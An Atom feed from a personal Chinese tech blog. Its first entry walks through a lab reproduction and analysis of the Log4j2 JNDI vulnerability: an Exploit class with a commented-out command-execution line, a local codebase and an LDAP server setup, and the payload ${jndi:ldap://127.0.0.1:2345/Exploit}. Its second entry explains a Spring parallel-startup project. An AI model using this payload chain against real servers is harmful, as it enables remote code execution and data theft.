<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://yao177.github.io</id>
    <title>Yao177&apos;s Blog</title>
    <updated>2022-03-02T09:36:33.276Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://yao177.github.io"/>
    <link rel="self" href="https://yao177.github.io/atom.xml"/>
    <subtitle>&lt;b&gt;E&lt;/b&gt;·rror = &lt;b&gt;m&lt;/b&gt;·ore * &lt;b&gt;c²&lt;/b&gt;·ode</subtitle>
    <logo>https://yao177.github.io/images/avatar.png</logo>
    <icon>https://yao177.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Yao177&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[安全｜Log4j2 复现与原理]]></title>
        <id>https://yao177.github.io/post/log4j2/</id>
        <link href="https://yao177.github.io/post/log4j2/">
        </link>
        <updated>2021-12-11T09:13:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞复现">漏洞复现</h1>
<h2 id="利用条件">利用条件：</h2>
<p>靶机需要能访问外网，若 jdk8 需要小于 u124</p>
<h2 id="web服务器">Web服务器</h2>
<p>任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。</p>
<h2 id="codebase服务器">CodeBase服务器</h2>
<p>直接用 python 自带的 SimpleHttpServer 即可。将恶意 class 放入目录下。</p>
<pre><code class="language-Java">public class Exploit {
    static {
//        try {
//            Runtime.getRuntime().exec(&quot;reboot&quot;); 可以是任意代码，例如关机指令、进程关闭、将服务器文件外传、将内网拓扑结构外传、嵌入挖矿软件，any
//        } catch (IOException e) {
//            e.printStackTrace();
//        } 
        System.out.println(&quot;Exploit!&quot;);
    }
}
</code></pre>
<p>启动服务器：python3 -m SimpleHTTPServer 1234</p>
<p>于是得到 codebase 地址：http://127.0.0.1:1234/</p>
<h2 id="ldap服务器">LDAP服务器</h2>
<p>随便找个LDAP简易服务器框架，例如https://github.com/mbechler/marshalsec</p>
<p>该框架运行参数为<code>&lt;codebase_url#classname&gt; [&lt;port&gt;]</code></p>
<p>我们测试时设置为：http://127.0.0.1:1234/#Exploit 2345</p>
<h2 id="复现">复现</h2>
<p>已知 controller 会打印参数信息，于是我们搜索：<br>
<img src="https://yao177.github.io/post-images/1646129092453.png" alt="" loading="lazy"></p>
<p>payload：<code>${jndi:ldap://127.0.0.1:2345/Exploit}</code><br>
得到：<br>
<img src="https://yao177.github.io/post-images/1646129683700.png" alt="" loading="lazy"></p>
<p>相关利用姿势：上传堆栈、上传业务类字节码，而后可以将所有源码看尽。</p>
<h2 id="完整攻击链">完整攻击链</h2>
<p>总结完整攻击链：<br>
<img src="https://yao177.github.io/post-images/1646129822790.svg" alt="" loading="lazy"></p>
<p>该漏洞及其危险，黑客只需额外两台服务器，并在任何可能被日志打印的接口参数中嵌入恶意信息即可。若靶机 jdk 版本大于等于 u124，那将无法复现解析 reference 以访问 codebase 服务器。</p>
<h1 id="漏洞原理">漏洞原理</h1>
<h2 id="log4j">log4j</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646130822954.png" alt="" loading="lazy"></figure>
<p>绕过冒号前缀校验</p>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646130861459.png" alt="" loading="lazy"></figure>
<p>将特殊指令解析为 jndi 指令=<br>
访问 LDAP 服务器，接收构造好的指向外部的 Reference（有两种传输方式，一种Reference，一种本地序列化）</p>
<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646130936561.png" alt="" loading="lazy"></figure>
<p>web 服务器接收后，反序列化 reference，并从 codebase 的URL对象中获取字节流：</p>
<p><img src="https://yao177.github.io/post-images/1646130973181.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646130999277.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646131017114.png" alt="" loading="lazy"><br>
<img src="https://yao177.github.io/post-images/1646131035747.png" alt="" loading="lazy"></p>
<p>利用我们定义的 javaFactory 进行类加载，还记得我们的设定么：</p>
<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646131063716.png" alt="" loading="lazy"></figure>
<p>这个ref便是我们的HTTP服务器：http://127.0.0.1:1234/，至此完成攻击。</p>
<h1 id="example">Example</h1>
<p>*ppo login、5*8 online</p>
<pre><code class="language-Java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
 com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
(['Sat Dec 11 21:06:39 2021'], ':', 'ender.append(AbstractOutputStreamAppender.java:108), org.apache.logging.log4j.core.appender.RollingFileAppender.append(RollingFileAppender.java:88), org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99), org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367), org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112), org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:738), org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:708), org.apache.logging.slf4j.Log4jLogger.info(Log4jLogger.java:193), com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
('receive from 2:', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
(['Sat Dec 11 21:06:39 2021'], ':', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), 
com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), 
org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java 框架｜Spring 启动加速器]]></title>
        <id>https://yao177.github.io/post/concurrent-spring-startup/</id>
        <link href="https://yao177.github.io/post/concurrent-spring-startup/">
        </link>
        <updated>2021-11-23T06:20:13.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
<li><a href="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF">项目背景</a></li>
<li><a href="#%E7%9F%A5%E8%AF%86%E8%83%8C%E6%99%AF">知识背景</a>
<ul>
<li><a href="#spring">Spring</a>
<ul>
<li><a href="#spring-%E7%AE%80%E8%BF%B0">Spring 简述</a></li>
<li><a href="#spring-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6">Spring 关键组件</a>
<ul>
<li><a href="#beanfactory">BeanFactory</a></li>
<li><a href="#applicationcontext">ApplicationContext</a></li>
<li><a href="#beanpostprocessor">BeanPostProcessor</a></li>
<li><a href="#instantiationawarebeanpostprocessor">InstantiationAwareBeanPostProcessor</a></li>
</ul>
</li>
<li><a href="#spring-%E5%AE%B9%E5%99%A8%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B">Spring 容器启动过程</a></li>
<li><a href="#spring-%E4%B8%8E%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%81%94%E7%B3%BB">Spring 与本项目的联系</a></li>
</ul>
</li>
<li><a href="#cglib">CGLIB</a>
<ul>
<li><a href="#cglib-%E7%AE%80%E8%BF%B0">CGLIB 简述</a></li>
<li><a href="#cglib-%E7%9A%84%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B">CGLIB 的使用示例</a></li>
<li><a href="#cglib-%E5%92%8C-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB">CGLIB 和 JDK 动态代理的区别</a></li>
<li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">注意事项</a></li>
<li><a href="#cglib-%E4%B8%8E%E6%9C%AC%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%81%94%E7%B3%BB">CGLIB 与本项目的联系</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF">设计思路</a>
<ul>
<li><a href="#%E6%8F%90%E5%87%BA%E7%9B%AE%E5%89%8D%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E5%AF%B9%E5%BA%94%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">提出目前的问题和对应解决方案：</a></li>
</ul>
</li>
<li><a href="#%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D">原理介绍</a>
<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%A7%88">项目概览</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B5%81%E7%A8%8B">创建代理流程</a></li>
<li><a href="#%E5%89%8D%E7%BD%AE%E6%A0%A1%E9%AA%8C">前置校验</a>
<ul>
<li><a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96-bean-%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E6%B3%95">如何获取 Bean 的初始化方法</a></li>
<li><a href="#%E6%A0%A1%E9%AA%8C%E7%B1%BB%E5%9E%8B">校验类型</a></li>
</ul>
</li>
<li><a href="#%E8%A3%85%E9%85%8D%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95%E7%AD%96%E7%95%A5">装配代理方法策略</a></li>
<li><a href="#%E5%AF%B9-factorybean-%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A4%84%E7%90%86">对 FactoryBean 的特殊处理</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1">创建代理对象</a></li>
<li><a href="#%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B">场景示例</a></li>
</ul>
</li>
<li><a href="#%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0">风险评估</a>
<ul>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%A1%8C%E4%B8%BA%E5%92%8C%E5%8E%9F%E6%9C%89-bean-%E7%9A%84%E5%B1%9E%E6%80%A7-%E8%A1%8C%E4%B8%BA%E4%B8%80%E8%87%B4">如何保证代理对象的行为和原有 Bean 的属性、行为一致？</a></li>
<li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%BC%9A%E9%94%99%E4%B9%B1">如何保证代理对象方法执行顺序不会错乱？</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E7%9A%84%E9%A3%8E%E9%99%A9%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">其他可能的风险如何解决？</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</p>
<h1 id="写在前面">写在前面</h1>
<p>Spring 官网自豪地对自家产品评价到：快速、简单、安全。「快速」被其列为了第一位，可见这是 Spring 最引以为傲的特性。<br>
<img src="https://yao177.github.io/post-images/1646029531559.jpeg" alt="Spring 官网介绍" loading="lazy"><br>
「快速」意味着快速开发、快速启动、快速运行……而对于「快速启动」这一点，开发人员也许还有可乘之机。</p>
<h1 id="项目背景">项目背景</h1>
<p>服务部署虽然通常给开发人员提供了宝贵的休息时间，但服务启动时间过长，也势必会影响开发效率，增大回滚时的风险。<br>
Spring Bean 初始化耗时占 Spring 启动时间的70%，若能优化 Spring Bean 的初始化时间，则会达到提高服务启动速度的目的。<br>
concurrent-spring-startup 是一个旨在让 Spring 通过并行化来提高启动速度的项目，无代码侵入，绿色健康可食用。</p>
<h1 id="知识背景">知识背景</h1>
<h2 id="spring">Spring</h2>
<h3 id="spring-简述">Spring 简述</h3>
<p>Spring 框架可以被理解为一个容器，它帮我们管理了应用程序所需要的所有 Bean。<br>
例如：我们会在项目里的很多地方用到同一个数据库连接池，我们只需要将它声明为一个 Spring Bean。Spring 启动时，会将这个 bean 创建并小心翼翼地保护好。在任何我们需要的时候，向它索取即可。<br>
Spring 的启动过程涉及非常多的逻辑。本文围绕 Bean 的生命周期来对这一过程做介绍。Spring 的启动可以简单理解为下面三部曲：<br>
创建 Spring 容器 -&gt; 扫描所有 Bean 定义 -&gt; 创建所有 Bean<br>
<img src="https://yao177.github.io/post-images/1646036988133.svg" alt="Spring 简易启动流程" loading="lazy"></p>
<h3 id="spring-关键组件">Spring 关键组件</h3>
<h4 id="beanfactory">BeanFactory</h4>
<p>即 Spring 用来管理 Bean 的容器，用户可以按照名称、类型等信息来获取指定的 Bean。<br>
在这个接口的不同实现中，Spring 管理了不同类型Bean的生命周期（实例化、初始化、销毁）。它容纳了 Spring 中各个Bean的实例、Bean 的定义（来自 XML 或代码）。<br>
它是 Spring 框架的核心接口。<br>
其本身只包含获取 Bean 的方法，而其具体实现类有一些重要方法：</p>
<ul>
<li><code>getBean (String beanName)</code><br>
从Spring 容器中获取指定名称的Bean实例。若还没有创建，则创建之。事实上，Spring 正是通过这个方法来创建 Bean 的。</li>
<li><code>populateBean (String beanName, RootBeanDefinition mbd, BeanWrapper bw)</code><br>
用于 Bean 的实例化。getBean 被执行时，Spring 会调用 populateBean 进行 bean 的创建。参数 mbd 即 bean 的属性定义，例如我们在 XML 里面设置的字段和值。若 bean 依赖了其它 bean，它还会触发其它 bean 的创建和注入。</li>
</ul>
<h4 id="applicationcontext">ApplicationContext</h4>
<p>BeanFactory 接口的子类，拓展了很多功能供开发者使用，例如手动注入 bean、获取 bean、获取 bean的指定属性等。<br>
它内部持有另一个 BeanFactory 的引用，并全权负责这个 BeanFactory 的生命周期（实例化、初始化、销毁）。因此它对 BeanFactory 接口的实现都是基于这个内部BeanFactory的。也就是说，ApplicationContext 是专门给外部使用的（Springboot、开发者），而它所提供的花里胡哨的功能具体实现是由内部的 beanFactory 去完成的。<br>
事实上 ApplicationContext 其实不用实现BeanFactory接口，它已经提供了<code>getAutowireCapableBeanFactory</code>方法来获得“真正的 BeanFactory”。也许是为了不让开发者在两个接口中来回切换，只关注一个 Spring 组件，于是一并把 BeanFactory 接口实现了。明白这一点可以让读者理解 ApplicationContext 和 BeanFactory 的关系。<br>
在它的实现类中，有一些重要的方法：</p>
<ul>
<li><code>refresh()</code><br>
大名鼎鼎的refresh方法即为Spring容器启动的入口。该方法会完整地创建自己持有的BeanFactory，并执行它的初始化动作（例如扫描Bean定义、实例化所有Bean、初始化所有Bean、添加各类处理器和监听器）。如果已经存在一个初始化完毕的BeanFactory，那就先销毁它，“推翻重来”。</li>
<li><code>loadBeanDefinitions(DefaultListableBeanFactory factory)</code><br>
在refresh方法里执行。ApplicationContext 会扫描所有定义 Bean 的地方（XML、注解、Groovy 等），并将其放置到内部持有的这个 factory 里面（通常是一个 Map&lt;String, BeanDefinition&gt;）。</li>
</ul>
<h4 id="beanpostprocessor">BeanPostProcessor</h4>
<p>Bean初始化前后的「钩子」。它有两个方法：</p>
<ul>
<li><code>postProcessBeforeInitialization(Object bean, String beanName)</code><br>
在具体的Bean初始化前被 Spring 容器调用，并对 Bean 进行一系列操作。例如 <code>ApplicationContextAwareProcessor</code> 的该方法会根据 bean 的类型，为各个 Spring 基础组件设置默认的属性。</li>
<li><code>postProcessAfterInitialization(Object bean, String beanName)</code><br>
在具体的 Bean 初始化完成后被 Spring 容器调用，允许对 Bean 进行一系列后置的操作。<br>
注意，Spring 容器将会把这两个方法返回值作为新的 Bean 来替代原有的 Bean。本项目正是利用了这个特性来完成 Bean 的“偷天换日”。</li>
</ul>
<h4 id="instantiationawarebeanpostprocessor">InstantiationAwareBeanPostProcessor</h4>
<p>BeanPostProcessor 的子类。它新增了方法：</p>
<ul>
<li><code>postProcessPropertyValues(PropertyValues pvs, PropertyDescriptor[] pds, Object bean, String beanName)</code><br>
该方法会在 bean 属性组装时调用。这里的属性（pvs）来自于用户在 XML 中或代码里指定的 Bean 的字段或属性。事实上，Spring 正是利用它来完成了依赖注入，例如它的实现之一——<code>AutowiredAnnotationBeanPostProcessor</code> 会在这个方法里将 bean 中被 @Autowired 和 @Value 标记的字段注入具体的值或者对象。</li>
</ul>
<h3 id="spring-容器启动过程">Spring 容器启动过程</h3>
<p>有了上文的基础，Spring 容器的启动流程可以进一步描述为：<br>
<img src="https://yao177.github.io/post-images/1646040974089.svg" alt="Spring 启动流程" loading="lazy"></p>
<h3 id="spring-与本项目的联系">Spring 与本项目的联系</h3>
<ul>
<li>本项目利用 Spring 的<code>BeanPostProcessor</code>来将原有 Bean 替换为自定义动态代理对象</li>
<li>利用<code>ApplicationListener</code>来保证 Spring 启动完成前所有的异步方法执行完成</li>
</ul>
<h2 id="cglib">CGLIB</h2>
<h3 id="cglib-简述">CGLIB 简述</h3>
<p>CGLIB 是一个运行时的字节码生成工具。<br>
在平时，字节码文件都是编译时创建的。而 CGLIB 可以在运行时创建字节码，故称作“动态”代理。<br>
CGLIB 可以用来为某个类创建一个子类，并在其方法（非全部）被调用时进行拦截，执行自己的逻辑。<br>
在 Spring 的 AOP 场景中，CGLIB 被大量使用。</p>
<h3 id="cglib-的使用示例">CGLIB 的使用示例</h3>
<pre><code class="language-Java">public class CglibTest {
    public void print() {
        System.out.println(&quot;CglibTest#print be invoked&quot;);
    }

    public static void main(String[] args) {
        Enhancer enhancer = new Enhancer(); //CGLIB的工具类
        enhancer.setSuperclass(CglibTest.class); //需要设置一个父类
        enhancer.setCallback(new MethodInterceptor() { //方法拦截器，o为代理对象，method为被调用的方法，objects为方法参数，methodProxy为代理方法，通常用于执行父类（原类）方法
            @Override
            public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable {
                System.out.println(&quot;CglibTestProxy#print be invoked&quot;);
                methodProxy.invokeSuper(o, objects); //执行父类方法
                return null;
            }
        });
        CglibTest cglibTest = (CglibTest) enhancer.create(); //创建代理对象
        cglibTest.print(); //执行方法
    }
}
</code></pre>
<p>输出结果</p>
<pre><code class="language-Shell">CglibTestProxy#print invoked
CglibTest#print invoked
</code></pre>
<p>运行示意图：<br>
<img src="https://yao177.github.io/post-images/1646041699356.svg" alt="cglib 代理流程" loading="lazy"></p>
<h3 id="cglib-和-jdk-动态代理的区别">CGLIB 和 JDK 动态代理的区别</h3>
<ul>
<li>使用区别：CGLIB 支持直接代理现成的类；JDK 只支持接口代理，应用场景被大打折扣。</li>
<li>效率区别：CGLIB 比 JDK 动态代理快出不止一个数量级。原因是拦截器入参中的 MethodProxy 里面会直接用原父类的引用进行方法调用，而非通过 Method 对象反射调用。<br>
读者可以简单理解为<code>super.print()</code>远比<code>super.class.getMethod(&quot;print&quot;).invoke()</code>快很多。这块实现较为复杂，由于篇幅限制，可以通过 <a href="https://zhuanlan.zhihu.com/p/106069224">CGLIB 动态代理的使用和分析</a> 简单了解。</li>
</ul>
<h3 id="注意事项">注意事项</h3>
<p>由于 CGLIB 本质是实现一个子类，因此它不能代理 final 修饰的类；<br>
由于 private、final 方法不能被继承，因此它的拦截器无法获取 private、final 修饰的方法；<br>
不要在<code>MethodProxy</code>中直接调用 invoke，这会导致循环调用，重复进入拦截器。应当只调用其<code>invokeSuper</code>方法。</p>
<h3 id="cglib-与本项目的联系">CGLIB 与本项目的联系</h3>
<p>利用 CGLIB 实现原有 Bean 的动态代理，配置自定义的方法策略。</p>
<h1 id="设计思路">设计思路</h1>
<p>由知识背景知，一个原生的 Spring 启动流程已在上文中举出。<br>
由项目背景得知，这个过程中耗时最长的是 Bean 的初始化。RPC 客户端与服务端建立连接、各个中间件连接池的创建等都在各自的 Bean 初始化中完成。这中间不乏复杂的计算逻辑和耗时的 IO 操作。倘若我们将 Bean 的初始化改成异步执行，那将实现 bean 的并行初始化，加快启动速度。</p>
<h2 id="提出目前的问题和对应解决方案">提出目前的问题和对应解决方案：</h2>
<ol>
<li>Bean 本身的初始化方法都是同步的，如何实现异步？——使用 CGLIB 代理，当执行初始化方法时放入线程池异步执行；</li>
<li>如何让 Spring 的 Bean 替换成我们的动态代理对象？——实现<code>BeanPostProcessor#postProcessBeforeInitialization</code>方法来在bean初始化前进行替换；</li>
<li>如何让保证 Bean 在被其他组件使用时，不会出现 Bean 未初始化完成的情况？——让 Bean 其他方法执行时同步等待其初始化完成；</li>
<li>如何保证 Spring 启动后，所有的 Bean 都初始化完成？——实现<code>ApplicationListener</code>来等待 Spring 启动完成通知，等待所有 Bean 初始化完成。<br>
至此，我们已经形成了解决思路，下节介绍项目具体实现。</li>
</ol>
<h1 id="原理介绍">原理介绍</h1>
<h2 id="项目概览">项目概览</h2>
<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646048369211.svg" alt="优化启动流程" loading="lazy"></figure>
<h2 id="创建代理流程">创建代理流程</h2>
<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646049504592.svg" alt="创建代理流程" loading="lazy"></figure>
<h2 id="前置校验">前置校验</h2>
<p>前置校验分为两部分，一是 Bean 的类能否创建 CGLIB 代理，二是该 Bean 的初始化方法能否被 CGLIB 代理。</p>
<h3 id="如何获取-bean-的初始化方法">如何获取 Bean 的初始化方法</h3>
<p>Spring Bean 有三种初始化方法（按执行顺序）：</p>
<ol>
<li><code>@PostConstruct</code>注解标记的方法<br>
获得方式：通过扫描类的方法注解可以过滤出。</li>
<li><code>InitializingBean</code>的<code>afterPropertiesSet</code>方法<br>
获得方式：直接反射获得之。</li>
<li>XML 中指定的<code>init-method</code>方法<br>
获得方式：反射获取该 Bean 的 <code>AbstractBeanDefinition</code> 的 <code>initMethodName</code> 字段。</li>
</ol>
<h3 id="校验类型">校验类型</h3>
<ol>
<li>该类能否被 CGLIB 代理
<ul>
<li>有无参构造函数</li>
<li>该类必须被声明为非 final 的</li>
<li>该类不能是 JDK 代理类或者 CGLIB 代理类</li>
</ul>
</li>
<li>该 Bean 的初始化方法能否被 CGLIB 代理
<ul>
<li>该方法必须被声明为非 final 的</li>
<li>该方法必须为非 static 或 private 的</li>
</ul>
</li>
</ol>
<h2 id="装配代理方法策略">装配代理方法策略</h2>
<blockquote>
<p>什么是代理方法策略：<br>
在代理对象被外部调用时，代理方法策略能将原有方法路由到不同的代理方法，以此确定方法的真正执行过程。</p>
</blockquote>
<p>在项目中，该策略实体是一个<code>ConcurrentHashMap</code>，key值为Method，value为WrappedMethod。<br>
<em>注：下表中original bean表示代理类持有的原bean的引用，method表示该方法策略被命中时，代理类被外部调用的方法</em></p>
<table>
<thead>
<tr>
<th>Bean 原有方法</th>
<th>代理策略</th>
<th>执行流程</th>
<th>附加说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>初始化方法</td>
<td>AsyncMethod</td>
<td>等待其依赖的 AsyncMethod 执行完毕后，在线程池中注册异步任务，对 original bean 执行 method。</td>
<td>该策略是项目能加速的原因。<br>其通过持有一个依赖的 AsyncMethod 引用，来保证初始化方法执行顺序是不变的。</td>
</tr>
<tr>
<td>Object.class的方法<br><code>FactoryBean#getObjectType</code></td>
<td>SyncMethod</td>
<td>直接令original bean执行method。</td>
<td>FactoryBean#getObjectType 的注释中明确说明，若方法返回 null 则表明该 bean 还未被初始化，因此提前调用是不违背 Spring 规范的。通过直接调用它来预测 FactoryBean#getObject 的返回类型，创建代理对象。</td>
</tr>
<tr>
<td>FactoryBean#getObject</td>
<td>ObjectProxyMethod</td>
<td>返回一个动态代理对象，该对象在被实际调用方法时必须等待其 FactoryBean 代理对象的所有 AsyncMethod 完成。</td>
<td>FactoryBean 初始化完成后，会调用 getObject，将返回值注入到 Spring 容器中。因此我们通过返回代理对象，在对象实际被调用的时候再等待 FactoryBean 初始化完成，来实现一个“懒加载”，增加并发度。</td>
</tr>
<tr>
<td>WrappedProxyBean#getOriginalBean<br>WrappedProxyBean#setOriginalBean</td>
<td>OriginalBeanGetterMethod<br>OriginalBeanSetterMethod</td>
<td>返回/设置该代理对象持有的original bean</td>
<td>这个组件内的所有代理对象都将实现 WrappedProxyBean 接口，用于返回/设置该代理对象持有的 original bean。</td>
</tr>
<tr>
<td>其余方法</td>
<td>DefaultMethod</td>
<td>等待该代理类的所有 AsyncMethod 完成时，执行 method。</td>
<td>其他方法调用时，必须等待所有 AsyncMethod 执行完成，以保证执行顺序不改变。</td>
</tr>
</tbody>
</table>
<p>下图是代理对象被执行时，代理方法策略的匹配过程。<br>
<img src="https://yao177.github.io/post-images/1646106362899.svg" alt="代理方法策略匹配流程" loading="lazy"></p>
<h2 id="对-factorybean-的特殊处理">对 FactoryBean 的特殊处理</h2>
<p>FactoryBean有两个重要方法：<code>getObject</code>、<code>getObjectType</code>。顾名思义，FactoryBean 是用来创建 Bean 的，因此在 FactoryBean 本身被创建后，Spring 会调用其 getObject 方法来获得一个新的 Bean，并注入到 Spring 容器中完成其整个生命周期。而 getObjectType 用于 FactoryBean 声明它所生产的 Bean 的类型。<br>
若我们不对 getObject 方法做处理，则在其被调用时，将会阻塞 Spring 线程。如图：<br>
<img src="https://yao177.github.io/post-images/1646106611326.svg" alt="阻塞spring流程" loading="lazy"><br>
如果我们令 FactoryBean 返回一个动态代理对象，并令动态代理对象被实际调用方法时，再等待 FactoryBean 初始化完成，则：<br>
<img src="https://yao177.github.io/post-images/1646106809424.svg" alt="不阻塞spring流程" loading="lazy"><br>
可以看到，对 getObject 的调用并没有阻塞 Spring 主线程，从而提高了启动速度。</p>
<h2 id="创建代理对象">创建代理对象</h2>
<ol>
<li>将 bean 的类型作为父类，将装配了代理方法策略的 MethodInterceptor 作为拦截器，利用 CGLIB 的 Enhancer 生成代理对象；</li>
<li>将该 Enhancer 实例存入缓存中，供之后相同类型的 Bean 直接使用，以此跳过前置校验和方法装配阶段；</li>
<li>将代理对象返回给 Spring 容器。</li>
</ol>
<h2 id="场景示例">场景示例</h2>
<p>假设有如下两个 Bean：</p>
<pre><code class="language-Java">@Bean
public class RpcClient implements FactoryBean, InitializingBean {
    RpcClient() {
    }
    public void afterPropertiesSet() {
        // do some socket work
    }
    public Object getObject() {
        return new RpcService();
    }
    public Class getObjectType() {
        return RpcService.class;
    }
    // other method
}
</code></pre>
<pre><code class="language-Java">@Bean
public Manger {
  @Resource
  RpcService rpcService;
  
  public String getName(int id) {
    return rpcService.getName(int id);
}
</code></pre>
<pre><code class="language-Java">public interface RpcService {
  String getName(int id);
}
</code></pre>
<p>当 Spring 启动时，本项目做以下事情：</p>
<ul>
<li>异步执行 RpcClient 的初始化方法，并返回 rpcClientProxy 给 Spring 容器；</li>
<li>Spring 执行 rpcClientProxy 的 getObject 方法，得到 rpcServiceProxy；</li>
<li>解决 Manger 依赖时，将 rpcServiceProxy 注入到 rpcService 字段；</li>
<li>当项目启动结束前，本项目将会等待 rpcClientProxy 的异步方法执行完毕。<br>
当<code>Manger#getName</code>被调用时：<br>
<img src="https://yao177.github.io/post-images/1646112526954.svg" alt="Manger#getName" loading="lazy"></li>
</ul>
<p>当 Spring 启动完成前，本项目会等待所有的异步方法执行完毕。因此当用户请求打入时，并不存在等待的过程。</p>
<h1 id="风险评估">风险评估</h1>
<p>本项目人为修改了部分 Spring 加载 Bean 的流程，因此不可避免地需要进行一些风险评估。</p>
<h2 id="如何保证代理对象的行为和原有-bean-的属性-行为一致">如何保证代理对象的行为和原有 Bean 的属性、行为一致？</h2>
<p>代理对象没有修改原有 Bean 的方法逻辑，它持有一个原有 bean 的引用，任何方法调用最终都会调用原有 bean 方法，因此属性和行为是没有变动的。</p>
<h2 id="如何保证代理对象方法执行顺序不会错乱">如何保证代理对象方法执行顺序不会错乱？</h2>
<p>本项目通过为所有的异步方法指定执行顺序，来保证它们不会并发执行；而对于其他方法，除能直接执行的方法 (Object.class 的方法、getObjectType 方法) 外，其余均需要等待初始化完成，保证了 Bean 相关代码的执行顺序。</p>
<h2 id="其他可能的风险如何解决">其他可能的风险如何解决？</h2>
<p>在初始化方法中操作 BeanFactory 可能导致项目死锁，无法启动。<br>
任何通过 BeanFactory 获取或操作 Bean 的行为都会被 Spring 并发控制。具体实现是通过 synchronized 获取 singletonObjects（<code>ConcurrentHashMap&lt;String, Object&gt;</code>，存放所有单例 Bean 的容器）的对象锁来避免同时操作单例 Bean 容器。<br>
由于 BeanPostprocessor 处于 Bean 加载的上下文中，因此总是持有 singletonObjects 的对象锁；若 Bean 在初始化方法中利用 beanFactory 操作其他 Bean ，则会导致如下情况：<br>
